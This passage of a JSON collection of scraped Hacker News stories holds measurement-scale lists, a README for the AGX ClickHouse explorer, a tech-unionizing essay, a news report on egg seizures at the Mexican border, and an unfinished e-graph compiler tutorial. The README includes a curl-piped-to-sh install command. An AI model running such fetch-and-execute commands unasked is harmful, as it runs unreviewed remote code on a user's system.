calculator\n\n0\nsmartphone in standby, LED indicator, small electronic device\n\n1\nsmartphone in active use, incandescent light bulb, laptop in sleep mode\n\n2\nlaptop in active use, TV, refrigerator, ceiling fan\n\n3\nmicrowave oven, hairdryer, small electric heater, average home\n\n4\nsmall office building, electric car at highway speed, industrial machinery\n\n5\nlarge commercial building, passenger airplane, small factory\n\n6\nsmall power plant, large office building, passenger train\n\n7\ncruise ship, skyscraper, small town's electricity usage\n\n8\nmedium-sized power plant, small city, large steel mill\n\n9\nlarge power plant, medium city, large industrial complex\n\n10\nnuclear power plant, large city, international airport\n\n12\nall power plants in a major country, civilization-level energy flow\n\n15\nworldwide human energy consumption, global electrical infrastructure\n\n17\ntotal solar energy intercepted by Earth, large asteroid impact\n\n26\ntotal energy output of the Sun, major stellar event\n\nKilowatt hours (kWh)\n\n-3\nsingle LED indicator for an hour, digital watch for a day\n\n-2\nbluetooth headset standby, hearing aid daily usage\n\n-1\nsmartphone standby mode for a day, fitness tracker weekly use\n\n0\nlaptop use for 5-10 hours, LED bulb for 1-2 days\n\n1\naverage US household daily usage, electric vehicle charge (30-40 miles)\n\n2\naverage US household weekly usage, Tesla Model S battery capacity\n\n3\naverage US household monthly usage, small business monthly consumption\n\n4\naverage US household yearly usage, small factory monthly operation\n\n5\nmedium-sized business yearly usage, small hospital monthly consumption\n\n6\nlarge factory monthly usage, small town daily consumption\n\n7\nsmall city monthly consumption, large industrial complex annual usage\n\n8\nmedium city monthly usage, average nuclear plant weekly output\n\n9\nlarge metropolitan area monthly consumption, nuclear plant monthly output\n\n10\nsmall country annual consumption, major hydroelectric dam yearly output\n\n11\nmedium-sized country annual energy consumption\n\n12\nUnited States quarterly electricity consumption, global energy industry day\n\n13\nglobal annual electricity production, all human energy use for weeks\n\nMilli-amp hours (mAh)\n\n-1\nhearing aid, bluetooth earbud, single LED for hours\n\n0\nsmartwatch, wireless mouse, fitness tracker weekly use\n\n1\nentry-level smartphone, wireless keyboard, medical device\n\n2\nflagship smartphone, tablet, e-reader, 1-2 days mixed use\n\n3\nultrabook laptop, portable speaker, 8-16 hours active use\n\n4\ngaming laptop, professional camera, 2-6 hours heavy use\n\n5\nelectric scooter, small drone, portable power station\n\n6\nelectric bicycle, professional video equipment, small UPS\n\n7\nelectric motorcycle, home backup battery, 4-12 hours essential load\n\n8\ncompact electric car, home energy storage, 100-250 miles range\n\n9\nluxury electric car, commercial backup, 250-400 miles range\n\n10\nelectric bus/truck, neighborhood microgrid, 100-300 miles\n\n11\ngrid-scale storage, commercial backup, days of power\n\nEnergy Storage Density (Wh/kg)\n\n0\nlead-acid, vehicle starter batteries, UPS systems\n\n1\nNi-MH, power tools, early hybrid vehicles\n\n2\nLi-ion common, smartphones, laptops, most EVs\n\n3\nnext-gen solid-state, emerging tech, future EVs\n\n4\ntheoretical lithium-air, research stage, potential future\n\nDollars per kilowatt hour\n\n-3\nwholesale hydroelectric power, excess grid energy during oversupply\n\n-2\nlarge industrial electricity contracts, utility-scale solar in optimal locations\n\n-1\ntypical residential electricity rates, grid-scale battery storage discharge\n\n0\npeak demand charges, small-scale battery storage, emergency backup power\n\n1\nremote microgrid electricity, power in disaster areas, portable power stations\n\n2\nhelicopter-delivered emergency power, extreme remote locations, military expeditions\n\n3\nspace station power costs, antarctic research stations during winter\n\n4\nearly satellite power systems, specialized military portable power\n\n5\nfirst space missions power costs, experimental fusion research energy\n\n6\ntheoretical cost of antimatter energy, earliest space program power supplies\n\nKilowatt hours per dollar\n\n-6\ntheoretical antimatter energy production, earliest space program power\n\n-5\nearly space mission power systems, experimental fusion research\n\n-4\nvintage satellite power, specialized military portable power systems\n\n-3\nspace station power, antarctic research station during winter\n\n-2\nhelicopter-delivered emergency power, extreme remote locations\n\n-1\nremote microgrid electricity, disaster area power, portable power stations\n\n0\npeak demand electricity, small-scale battery storage, emergency backup generators\n\n1\ntypical residential electricity, standard grid power in developed countries\n\n2\nlarge industrial electricity contracts, utility-scale solar in optimal locations\n\n3\nwholesale hydroelectric power, excess grid energy during oversupply periods\n\nInformation (bits)\n\n0\nbinary digit, yes/no answer, single state\n\n1\ntwo decimal digits, 3-digit binary number, single ASCII character\n\n2\nshort sentence in ASCII, small icon, QR code with URL\n\n3\nparagraph of text, small black and white image, musical note\n\n4\npage of text, low-resolution image, short audio clip\n\n5\nbook chapter, medium-quality image, few seconds of MP3 audio\n\n6\nentire book, high-quality photo, minute of music\n\n7\nencyclopedia article, RAW photo, song\n\n8\nsmall database, short video clip, software application\n\n9\nentire encyclopedia, hour of standard video, complex software\n\n10\nlibrary collection, 4K movie, large dataset\n\n11\nall books in a large library, 8K video collection, enterprise database\n\n12\nLibrary of Congress holdings, year of HD video content\n\n13\nall words ever spoken by humans, DNA of human population sample\n\n14\nall music ever recorded, high-resolution brain scan database\n\n15\nall text/images ever published online, large enterprise data\n\n16\nglobal daily internet traffic, astronomical observation data\n\n17\nall digital content produced in a year, particle physics data\n\n18\nall human knowledge digitized, complete genomic database\n\nThroughput (bps)\n\n0\ntelegraph, Morse code transmission\n\n1\nslow teletype, early text terminals\n\n2\nearly dialup modems, basic telemetry\n\n3\nearly home internet, text-only experiences\n\n4\nbasic dialup internet, text with simple images\n\n5\nfast dialup, early mobile data\n\n6\nearly broadband, basic streaming audio\n\n7\nstandard home broadband, SD video streaming\n\n8\nfast home internet, HD video streaming\n\n9\ngigabit internet, 4K video streaming\n\n10\nenterprise connection, multiple 8K streams\n\n11\ndata center interconnect, major backbone links\n\n12\nmajor internet backbone, submarine cable systems\n\n13\nmulti-cable submarine systems, satellite constellations\n\n14\nglobal internet infrastructure, combined backbone capacity\n\nOperations\n\n0\nsingle CPU instruction, one line of code execution\n\n1\nsimple database query, basic API call, small function execution\n\n2\ncomplex database transaction, rendering a web page, image processing routine\n\n3\nvideo frame rendering, machine learning prediction, complex search algorithm\n\n4\n3D scene rendering, large language model inference, complex sorting of large data\n\n5\nimage recognition pipeline, real-time video processing, large matrix multiplication\n\n6\ntraining small machine learning model, full-text search of large corpus\n\n7\n3D animation rendering, large-scale data processing job, genome sequence alignment\n\n8\nclimate simulation timestep, protein folding calculation, large ML model training\n\n9\ncomplex physics simulation, global weather model update, large video rendering\n\n10\nastronomical simulation, national-scale logistics optimization\n\n12\nglobal climate model, universe simulation timestep, cryptocurrency blockchain\n\nOperations per second\n\n0\nmechanical calculator, human mental arithmetic\n\n1\ndesktop calculator, early microcontroller\n\n2\nvintage personal computer, 1980s gaming console\n\n3\n1990s desktop computer, early smartphone\n\n4\nentry-level modern CPU core, embedded system\n\n5\nhigh-end desktop processor, game console GPU\n\n6\nserver-grade CPU, high-end graphics card (FLOPS)\n\n7\nsmall cluster of servers, specialized AI hardware\n\n8\nsupercomputer, large data center processing capacity\n\n9\ntop 10 supercomputer, major cloud region processing power\n\n10\ncombined processing power of major cloud provider\n\n11\nestimated global computing infrastructure\n\n12\nhypothetical exascale supercomputing network\n\n15\ntheoretical quantum computing milestone\n\n18\ncomputational capacity to simulate human brain\n\nOperations per Joule\n\n-9\nmechanical computing, early vacuum tube computers\n\n-6\nearly transistor computers, 1960s mainframe\n\n-3\npersonal computers of the 1980s, early laptops\n\n0\ndesktop computers, game consoles, typical server\n\n3\nmobile phones, low-power embedded systems\n\n6\nspecialized efficiency hardware, advanced mobile processors\n\n9\ntheoretical thermodynamic limits of conventional computing\n\n12\nquantum computing theoretical efficiency, reversible computing\n\n17\nLandauer limit (theoretical maximum computing efficiency)\n\nOperations per dollar\n\n-3\nmechanical calculators, earliest electronic computers\n\n0\n1980s personal computers, vintage game systems\n\n3\nlow-end smartphone, basic cloud computing instance\n\n6\nhigh-performance computing, GPU cloud instances\n\n9\nmajor cloud provider data centers, enterprise computing\n\n12\nglobal computing infrastructure efficiency projection\n\n15\ntheoretical future of computing price-performance",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6de557499066e0d5",
    "title": {
      "en": "Show HN: AGX – Open-Source Data Exploration for ClickHouse (The New Standard?)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/agnosticeng/agx",
    "score": 46,
    "by": "didierfranc",
    "time": 1742395874,
    "content": "agx\nagx is a desktop application that lets you explore and query data through a modern interface. It's built with Tauri, SvelteKit and Plot, and can work in two ways: as a native desktop app using ClickHouse's embedded database (chdb), or as a web interface connected to a Clickhouse server instance.\nPreview\n\nFeatures\n\nNative desktop application performance with web technologies\nInteractive SQL query editor with syntax highlighting\nSchema browser for exploring data structure\nResults displayed in a tabular format\nSupport for drag & drop file operations\nCross-platform compatibility (macOS, Linux, Windows)\n\nPrerequisites\n\nNode.js (v16 or later)\nRust toolchain\nSystem dependencies for Tauri\n\nGetting Started\n→ Native (chdb)\nGet the latest release from GitHub.\n→ Live (clickhouse)\nhttps://agx.app\n→ Local (clickhouse)\n\nClone the repository:\n\ngit clone https://github.com/agnosticeng/agx && cd agx\n\nRun with docker compose:\n\ndocker compose up\n\nAccess the application via http://localhost:8080\n\nProject Structure\nagx/\n├── src/                 # Frontend source code (SvelteKit)\n│   ├── lib/             # Shared components\n│   └── routes/          # Application routes\n├── src-tauri/           # Backend source code (Rust)\n│   ├── src/             # Rust source files\n│   └── Cargo.toml       # Rust dependencies\n├── package.json         # Node.js dependencies\n└── README.md\n\nInstalling Agnostic UDF\nInstall Agnostic ClickHouse UDFs with a single command:\ncurl -fsSL https://raw.githubusercontent.com/agnosticeng/agx/main/scripts/install_agnostic_udfs.sh | sh\n\nDevelopment\n\nThe frontend is built with SvelteKit, offering a reactive and efficient UI\nThe backend uses Tauri with Rust, providing native performance and security\nCommunication between frontend and backend happens through Tauri's IPC bridge\nData querying is handled by chdb, an embedded ClickHouse engine\n\nContributing\nContributions are welcome! Please feel free to submit a Pull Request.\nLicense\nThis project is licensed under the MIT License - see the LICENSE file for details.\nThe MIT License is one of the most popular open-source licenses because it:\n\nIs simple and permissive\nAllows commercial use\nAllows modification and distribution\nAllows private use\nHas minimal restrictions\nIs compatible with many other licenses",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "120a17d363f0ec34",
    "title": {
      "en": "The Burnout Machine",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://unionize.fyi",
    "score": 780,
    "by": "flxfxp",
    "time": 1742495057,
    "content": "The Burnout Machine\n        Originally written by Biozombie, published in 2600 Hacker Quarterly, Autumn 2024\n\n            Let’s get real for a minute: the tech industry loves to sell us on the myth of the \"dream\n            job.\"\n            You\n            know\n            the\n            pitch - beanbags in the office, free kombucha on tap, and \"Agile\" processes that are supposed to\n            make\n            everything\n            more flexible, more efficient. But the reality? It’s a meat grinder that chews up developers,\n            sysadmins,\n            and\n            infosec pros and spits them out the other side - burnt out, disillusioned, and disposable.\n\n            We’re living in a world where billion dollar tech companies expect us to live and breathe code,\n            demanding\n            80\n            hour weeks under the guise of \"passion.\" And what do we get in return? Burnout, anxiety, and the\n            constant\n            threat\n            of layoffs. It’s time to face facts: this industry is not your friend. It’s a machine, and\n            unless we\n            start\n            organizing, it’s going to keep grinding us down. It’s time to talk about unionizing tech jobs.\n\n            Remember when Agile was supposed to save us all? Flexible sprints, self-organizing teams - yeah, right. In\n            practice, Agile has been twisted into a tool for management to push us harder and faster. They say\n            it’s\n            about\n            \"responding to change over following a plan,\" but let’s be honest - it’s about dangling\n            more\n            carrots\n            and keeping\n            us on a treadmill that never stops. The sprint becomes a marathon, and we’re the ones paying the\n            price.\n\n            And then there’s burnout. We’re in an industry where burnout isn’t just common -\n            it’s\n            expected. If you’re not\n            pulling all-nighters, you’re \"not committed.\" If you’re not answering Slack messages at\n            midnight,\n            you’re \"not a\n            team player.\" This culture is toxic, and it’s only getting worse. The relentless churn of\n            projects,\n            the\n            constant\n            pressure to innovate, and the ever-present threat of obsolescence create a perfect storm of stress. And\n            what’s\n            the industry’s solution? A mindfulness app and a lecture on work-life balance. Give me a break.\n\n            Let’s talk about job security - because there isn’t any. The tech industry loves to hype itself\n            as a\n            meritocracy, where the best and the brightest rise to the top. But in reality, it’s a meat market. As\n            soon\n            as\n            you’re not \"on the cutting edge,\" you’re out. Outsourcing, contract work, gig economy\n            bullshit -\n            it’s all\n            designed to keep us insecure, to keep us grinding away at the next big thing with no guarantee that\n            we’ll\n            have a\n            job next week, next month, or next year.\n\n            Companies love to brag about their innovation, but the real innovation is finding new ways to make us\n            disposable. Permanent employment? That’s for suckers. Why pay benefits and offer job security when\n            they\n            can\n            churn through contractors and freelancers like cheap code? And don’t get me started on those\n            non-compete\n            clauses\n            - designed to keep you locked down and terrified to make a move that might actually be good for your career.\n\n            And let’s not forget the ethical side of this equation. We’re being asked to build the future,\n            to\n            develop AI,\n            blockchain, and all the other buzzword technologies that are supposed to change the world. But at what cost?\n            How\n            many of us have been forced to work on projects that make us sick to our stomachs - surveillance tech, data\n            mining tools, algorithms that reinforce social biases - because we don’t have the power to say no?\n\n            That’s the kicker. We’re the ones building the damn future, but we have no say in how it’s\n            built. We don’t get\n            to decide whether our code is used for good or for evil. And as long as we’re isolated, as long as\n            we’re afraid\n            to speak up because we might lose our jobs, nothing will change.\n\n            This industry isn’t going to fix itself. The billionaires at the top aren’t going to suddenly\n            grow a\n            conscience,\n            and they aren’t going to give us the power to push back. That power has to come from us - from\n            organizing,\n            from\n            resisting, from breaking - unless we organize, unless we unionize.\n\n            Unionizing isn’t just about getting better pay or benefits (though we desperately need both).\n            It’s\n            about taking\n            back some control. It’s about having a say in how we work, what we work on, and how we’re\n            treated.\n            It’s about\n            saying no to the endless churn, the burnout culture, the gig economy bullshit.\n\n            And don’t let anyone tell you it’s impossible. The Alphabet Workers Union at Google?\n            They’re\n            showing us it can\n            be done. They’re standing up to one of the biggest companies in the world and saying,\n            \"Enough.\" We\n            need\n            more of\n            that. We need to take that energy and spread it across the industry - across all the companies that are\n            profiting off our sweat and tears.\n\n            Hackers, we’ve always been about more than just code. We’ve been about freedom - freedom of\n            information, freedom\n            from control. Unionizing is the next logical step. It’s about taking the hacker ethos into the\n            workplace,\n            about\n            organizing to protect ourselves and each other.\n\n            Start the Conversation: Talk to your coworkers. Break the silence. The first step to\n                organizing is\n                realizing you’re not alone.\n\n            Support Existing Efforts: If you’re in a company where union efforts are already\n                underway, get\n                involved.\n                If not, start thinking about how you can start one.\n\n            Use Your Skills: We’re hackers - we know how to communicate securely, how to\n                organize without\n                being\n                detected. Let’s use those skills to build something real, something that can stand up to the\n                powers that\n                be.\n            Push for Ethics: Let’s make sure that any union platform we build isn’t\n                just about wages and\n                hours, but\n                about ethics too. We need to have a say in what we’re building and how it’s used.\n\n            The tech industry is a runaway train, and if we don’t do something soon, we’re going to get run\n            over. The\n            burnout, the job insecurity, the nightmares - it’s all going to keep getting worse unless we take a\n            stand.\n            Unionizing isn’t just a nice idea - it’s a necessity.\n\n            So let’s do what hackers do best: let’s disrupt. Let’s take the tools they’ve given\n            us, the skills we’ve\n            honed, and use them to build something better. Let’s unionize. Let’s take back our industry,\n            take back our\n            jobs, and take back our futures.\n\n            The future of tech is being written right now, and it’s up to us to decide what kind of story it will\n            be.\n            Let’s make it a story we can be proud of.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ee58c3e73bfc3e13",
    "title": {
      "en": "'Eggflation' sending US shoppers to Mexico – where $300 fines await",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.theguardian.com/us-news/2025/mar/21/eggflation-us-mexico-fines",
    "score": 39,
    "by": "paulpauper",
    "time": 1742670820,
    "content": "A sign in a Costco warehouse in Sheridan, Colorado, on 13 March 2025. Photograph: David Zalubowski/APView image in fullscreenA sign in a Costco warehouse in Sheridan, Colorado, on 13 March 2025. Photograph: David Zalubowski/APUS-Mexico border‘Eggflation’ sending US shoppers to Mexico – where $300 fines await‘Egg interceptions’ are up more than 150% at some ports of entry as a US avian flu outbreak fuels shortagesKatharine Gammon in Los AngelesFri 21 Mar 2025 10.00 GMTLast modified on Fri 21 Mar 2025 21.39 GMTShareIn grocery stores across the US, egg shelves sitting empty and desolate have become a sign of the times. A surging bird flu outbreak affected nearly 19 million birds in January alone, wiping out supply and sending prices soaring.Officials forecast a 41% increase in egg prices this year in what some are calling “eggflation”. Where eggs are available, consumers are often limited in the number they can purchase at a time. Breakfast chains from Waffle House to Denny’s have added a surcharge of $0.50 for each egg served up.The situation is driving some people to new places to source their eggs: over the southern border. US Customs and Border Protection (CBP) has intercepted an increasing number of eggs from Mexico, where a carton of a dozen costs about $2. For comparison, the cost in many parts of California is just under $10 per dozen, according to the United States Department of Agriculture.Nationally, there has been a 48% increase in eggs being detained at ports of entry this fiscal year compared with the same time last fiscal year, according to CBP. In San Diego, these “egg interception” cases have increased by a whopping 158%.Every day, more than 200,000 cars cross the border from Mexico to the United States. Some of those cars carry groceries, medications and other goods that are less expensive over the southern border.“It’s very common for people to shop for their groceries on the Mexican side and bring them across,” said Joaquin Luken, executive director of the Smart Border Coalition, a group that helps facilitate cross-border mobility. “So a lot of them bring dry produce materials that they buy on the Mexican side.”But the problems start with fresh items – especially eggs. Importing raw or fresh eggs into the US from Mexico is prohibited due to concerns about diseases such as highly pathogenic avian influenza – also known as bird flu – and another highly contagious avian illness called virulent Newcastle disease, said Roger Maier, a public affairs specialist with CBP.And it’s not just eggs. Travelers are prohibited from bringing raw chicken, unprocessed avian products and live birds into the United States, Maier said. Even used egg cartons can spread the same diseases. There are some exceptions for fully cooked egg products.That’s why anyone with agricultural products has to declare them to border officers and agriculture specialists. “Failure to declare may lead to potential fines and penalties,” said Maier. He added that most of the eggs being confiscated by border agriculture specialists are from travelers who declared the product and then abandoned them without consequence.“There have been very few cases of people purposefully evading the inspection process/failing to declare the product,” he said. “When that happens, a $300 civil penalty is applied, and the eggs are seized.”Once confiscated, the eggs are destroyed by officials in oven-sized incinerators. Repeat offenders can be fined up to $10,000.skip past newsletter promotionSign up to Headlines USFree newsletterGet the most important US headlines and highlights emailed direct to you every morningEnter your email address Sign upPrivacy Notice: Newsletters may contain info about charities, online ads, and content funded by outside parties. For more information see our Privacy Policy. We use Google reCaptcha to protect our website and the Google Privacy Policy and Terms of Service apply.after newsletter promotionLuken advises shoppers to always check the CBP’s social media sites, because items that are allowed at one time may change and be prohibited when conditions such as disease outbreaks occur in the US.Other countries are stepping up to help the egg shortage: Turkey has agreed to sell 15,000 tons of eggs to the US through July. South Korea has also signed on to sell eggs to the US, but the myriad laws and regulations in each country around eggs makes it complicated. The USDA secretary, Brooke Rollins, said she was talking to other countries. “We continue to work on that issue very, very aggressively in the short term,” she said in a press conference on Thursday, “to keep getting the price of eggs down.”That leaves Americans still struggling for their egg fix, making the southern border an attractive option.Most people are not trying to skirt the laws, Maier said. But they may not know the requirements: always let the officials know whether you have fresh items, he advised. “The vast majority of egg intercepts are from travelers who declare them when asked,” he said.Explore more on these topicsUS-Mexico borderEggsBird fluUS economyFoodnewsShareReuse this contentMost viewedF1: Piastri wins Chinese GP, with McLaren teammate Norris second – as it happenedMark Carney to announce Canadian election and will run in Ottawa’s Nepean ridingUnited pilot attacked passenger for taking too long in the bathroom, lawsuit alleges‘I was sexualised, patronised and ridiculed’: how Charlotte Church survived the tabloids to become an earth motherMy adult daughter wants to turn herself back into a teenager",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e1758e0adb4e9a6b",
    "title": {
      "en": "Specializing Python with E-Graphs",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://vectorfold.studio/blog/egglog",
    "score": 61,
    "by": "dtseng123",
    "time": 1742302720,
    "content": "We've explored progressively more sophisticated techniques for optimizing numerical computations. We started with basic MLIR concepts, moved through memory management and linear algebra, and then neural network implementations. Each layer has added new capabilities for expressing and optimizing computations. Now we're reading to build our first toy compiler for Python expressions.\nIn this section, we'll explore how to use the egglog library to perform term rewriting and optimization on Python expressions and compile them into MLIR.\nThe entire source code for this section is available on GitHub.\nEquality Saturaiton and E-Graphs\nBefore we dive into the implementation, let's review the key concepts of equality saturation and e-graphs.\nTake as an example if we have the rewrites.\n\nx * 2 → x << 1\nx*y/x → y\n\nAnd we try to apply it over the expression (a * 2)/2 becomes (a << 1)/2. However we should have cancelled the 2 in the numerator and denominator and got a which results in a simpler expression. The order of rewrites is important and we want to find an optimal order of rewrites that reduces the expression to a form according to a cost function. This is called the phase ordering problem.\nThe egg library employs an approach that involves exhaustively applying all possible rewrites to an expression, effectively addressing the phase ordering problem through the use of an e-graph. This approach allows for the exploration of all possible rewrites, followed by the extraction of the most optimal form of the expression.\nIn linear algebra for example, matrix operations with NumPy like transpose, multiplication, are quite expensive because they involve touching every element of the matrix. But there is a wide range of identities that can be applied to reduce the number of operations.\nCompilers like LLVM and even the linalg dialect of MLIR doesn't know about these identities and so can't necessarily abstract away the expensive operations by applying rewrites. However at a high-level (our core language) we can use e-graph to produce much more efficient tensor manipulation operations before lowering them into MLIR.\nFor example, the following identities are quite common in linear algebra:\n(AB)T=BTAT(A B)^T = B^T A^T(AB)T=BTAT\n(AT)T=A(A^T)^T = A(AT)T=A\nOr in Python:\nnp.transpose(A * B) = np.transpose(B) * np.transpose(A)\nnp.transpose(np.transpose(A)) == A\nBy applying these rules, we can optimize NumPy expressions at compile time, leading to significant performance improvements. For instance, in our example, we've successfully reduced three loops—comprising one multiplication and two transposes—down to just two loops, which consist of one multiplication and one transpose. This optimization not only simplifies the computation but also enhances efficiency. In common uses of NumPy, there are numerous opportunities for such optimizations, often referred to as low-hanging fruit. These optimizations can be systematically applied to reduce the number of operations required, thereby streamlining the execution of numerical computations. This is particularly beneficial before even LLVM's auto-vectorization comes into play, as it allows us to leverage the full potential of our expressions and achieve faster execution times.\nAn e-graph (equality graph) is a data structure that compactly represents many equivalent expressions. Instead of maintaining a single canonical form for expressions, e-graphs maintain classes of equivalent expressions. This approach allows for more flexible and efficient term rewriting.\nLet's look at a concrete example using egglog library to do basic simplification. First we have to define our expression model.\nfrom __future__ import annotations\nfrom egglog import *\n\nclass Num(Expr):\n    def __init__(self, value: i64Like) -> None: ...\n\n    @classmethod\n    def var(cls, name: StringLike) -> Num: ...\n\n    def __add__(self, other: Num) -> Num: ...\n\n    def __mul__(self, other: Num) -> Num: ...\n\n# Create an e-graph to store our expressions\negraph = EGraph()\n\n# Define our expressions and give them names in the e-graph\nexpr1 = egraph.let(\"expr1\", Num(2) * (Num.var(\"x\") + Num(3)))  # 2 * (x + 3)\nexpr2 = egraph.let(\"expr2\", Num(6) + Num(2) * Num.var(\"x\"))    # 6 + 2x\n\n# Define our rewrite rules using a decorated function\n@egraph.register\ndef _num_rule(a: Num, b: Num, c: Num, i: i64, j: i64):\n    yield rewrite(a + b).to(b + a)                    # Commutativity of addition\n    yield rewrite(a * (b + c)).to((a * b) + (a * c))  # Distributive property\n    yield rewrite(Num(i) + Num(j)).to(Num(i + j))     # Constant folding for addition\n    yield rewrite(Num(i) * Num(j)).to(Num(i * j))     # Constant folding for multiplication\n\n# Apply rules until no new equalities are found\negraph.saturate()\n\n# Check if expr1 and expr2 are equivalent\negraph.check(eq(expr1).to(expr2))\n\n# Extract the simplified form of expr1\negraph.extract(expr1)\nUsing the egraph.display() function we can visualize the e-graph.\nThe input expression before equality saturation:\n\nThen the output with all the equivalences classes is a network of expressions:\n\nFrom there we can extract the expression we want according to a custom cost function.\nFoundation Layer\nOk now let's apply this to our basic expression compiler. Our compiler pipeline has several key stages:\n\nPython function decoration and type annotation\nExpression tree extraction\nTerm rewriting and optimization using e-graphs\nMLIR code generation\nLLVM compilation and JIT execution\n\nThe foundation layer of our compiler provides the core abstractions for representing and manipulating mathematical expressions. This layer is crucial as it forms the basis for all higher-level optimizations and transformations. Let's explore each component in detail.\nExpression Model (expr_model.py)\nAt the heart of our compiler is an expression model that represents mathematical expressions as an abstract syntax tree (AST). The model is implemented using Python's dataclasses for clean and efficient representation.\nCore Expression Types\nThe base class for all expressions is the Expr class, which provides the fundamental operations:\n@dataclass(frozen=True)\nclass Expr:\n    def __add__(self, other: Expr) -> Expr:\n        return Add(self, as_expr(other))\n\n    def __mul__(self, other: Expr) -> Expr:\n        return Mul(self, as_expr(other))\n    # ... other operations\nThe expression model consists of three fundamental types:\nLiterals: Constants in our expressions\n@dataclass(frozen=True)\nclass FloatLiteral(Expr):\n    fval: float  # Floating-point constant\n\n@dataclass(frozen=True)\nclass IntLiteral(Expr):\n    ival: float  # Integer constant\nSymbols: Variables and function names\n@dataclass(frozen=True)\nclass Symbol(Expr):\n       name: str  # Variable or function name\nOperations: Both unary and binary operations\n@dataclass(frozen=True)\nclass UnaryOp(Expr):\n       operand: Expr  # Single operand\n\n@dataclass(frozen=True)\nclass BinaryOp(Expr):\n    lhs: Expr  # Left-hand side\n    rhs: Expr  # Right-hand side\nAnd then we can define instances of our operations.\n@dataclass(frozen=True)\nclass Add(BinaryOp): pass      # Addition\n...\n\n@dataclass(frozen=True)\nclass Sin(UnaryOp): pass       # Sine\nBuilt-in Functions (builtin_functions.py)\nThe built-in functions module provides a NumPy-like interface for mathematical operations. This makes it easier for users to write expressions in a familiar syntax while still leveraging our optimization framework. It includes common mathematical constants and helper functions for operations like absolute value.\n# A mock NumPy namespace that we convert into our own expression model\n\nimport math\nfrom mlir_egglog.expr_model import (\n    sin,\n    cos,\n    tan,\n    asin,\n    acos,\n    atan,\n    tanh,\n    sinh,\n    cosh,\n    sqrt,\n    exp,\n    log,\n    log10,\n    log2,\n    float32,\n    int64,\n    maximum,\n)  # noq\n\n# Constants\ne = math.e\npi = math.pi\n\n# Define abs function\ndef abs(x):\n    return maximum(x, -x)\n\ndef relu(x):\n    return maximum(x, 0.0)\n\ndef sigmoid(x):\n    return 1.0 / (1.0 + exp(-x))\n\n__all__ = [\n    \"sin\",\n    \"cos\",\n    \"tan\",\n    \"asin\",\n    \"acos\",\n    \"atan\",\n    \"tanh\",\n    \"sinh\",\n    \"cosh\",\n    \"sqrt\",\n    \"exp\",\n    \"log\",\n    \"log10\",\n    \"log2\",\n    \"float32\",\n    \"int64\",\n    \"e\",\n    \"pi\",\n    \"maximum\",\n    \"abs\",\n]\nTerm IR (term_ir.py)\nThe Term IR layer provides an intermediate representation optimized for term rewriting and equality saturation. A key feature of the Term IR is a cost model for different operations:\nCOST_BASIC_ARITH = 1   # Basic arithmetic (single CPU instruction)\nCOST_CAST = 2          # Type conversion operations\nCOST_DIV = 5           # Division\nCOST_POW_INTEGER = 10  # Integer power\nCOST_SQRT = 20         # Square root\nCOST_LOG = 30          # Logarithm\nCOST_EXP = 40          # Exponential\nCOST_POW = 50          # General power operation\nCOST_TRIG_BASIC = 75   # Basic trigonometric functions\nCOST_HYPERBOLIC = 180  # Hyperbolic functions\nThese costs are used by the e-graph optimization engine to make decisions about which transformations to apply. The costs roughly correspond to the computational complexity of each operation on modern hardware.\nfrom __future__ import annotations\n\nimport egglog\nfrom egglog import StringLike, i64, f64, i64Like, f64Like  # noqa: F401\nfrom egglog import RewriteOrRule, rewrite\nfrom typing import Generator\nfrom mlir_egglog.expr_model import Expr, FloatLiteral, Symbol, IntLiteral\nfrom abc import abstractmethod\n\ndef as_egraph(expr: Expr) -> Term:\n    \"\"\"\n    Convert a syntax tree expression to an egraph term.\n    \"\"\"\n    from mlir_egglog import expr_model\n\n    match expr:\n        # Literals and Symbols\n        case FloatLiteral(fval=val):\n            return Term.lit_f32(val)\n        case IntLiteral(ival=val):\n            return Term.lit_i64(int(val))\n        case Symbol(name=name):\n            return Term.var(name)\n\n        # Binary Operations\n        case expr_model.Add(lhs=lhs, rhs=rhs):\n\n        # Rest of the operations\n        ...\nThe cost model is used to guide the e-graph optimization engine to find the most cost-effective implementation according to our cost model. For example\nex⋅ex⋅ex=e3xe^x \\cdot e^x \\cdot e^x = e^{3x}ex⋅ex⋅ex=e3x\nThe LHS has 3 multiplications and the RHS has 1 multiplication. So the cost applied to the extraction will select the RHS.\nTransformation Layer\nOne of the most powerful features of our compiler is its ability to symbolically interpret Python functions. This process transforms regular Python functions into our IR representation, allowing us to apply optimizations on the resulting expression tree.\nThe interpretation process is handled by the interpret function:\nimport types\nimport inspect\n\nfrom mlir_egglog import expr_model as ir\n\ndef interpret(fn: types.FunctionType, globals: dict[str, object]):\n    \"\"\"\n    Symbolically interpret a python function.\n    \"\"\"\n    # Get the function's signature\n    sig = inspect.signature(fn)\n\n    # Create symbolic parameters for each of the function's arguments\n    params = [n for n in sig.parameters]\n    symbolic_params = [ir.Symbol(name=n) for n in params]\n\n    # Bind the symbolic parameters to the function's arguments\n    ba = sig.bind(*symbolic_params)\n\n    # Inject our globals (i.e. np) into the function's globals\n    custom_globals = fn.__globals__.copy()\n    custom_globals.update(globals)\n\n    # Create a temporary function with our custom globals\n    tfn = types.FunctionType(\n        fn.__code__,\n        custom_globals,\n        fn.__name__,\n        fn.__defaults__,\n        fn.__closure__,\n    )\n    return tfn(*ba.args, **ba.kwargs)\nThe function begins with parameter analysis, where it analyzes the input function's signature to determine its parameters. For each parameter, it creates a symbolic representation using our Symbol class. These symbols will be used to track variables through the expression tree.\nNext, the symbolic parameters are bound to the function's argument slots, creating a mapping between parameter names and their symbolic representations. The function then injects our custom implementations of mathematical operations, such as NumPy functions, into the function's global namespace. This allows us to intercept calls to these functions and replace them with our symbolic operations.\nA temporary function is created with the modified globals, while retaining the same code, name, and closure as the original function. Finally, the function is executed with the symbolic parameters, resulting in an expression tree that represents the computation.\nFor example, given a Python function:\ndef f(x, y):\n    return np.sin(x) + np.cos(y)\nThe interpretation process will:\n\nCreate symbols for x and y\nReplace np.sin and np.cos with our symbolic versions\nExecute the function with symbolic inputs\nReturn an expression tree representing Sin(Symbol(\"x\")) + 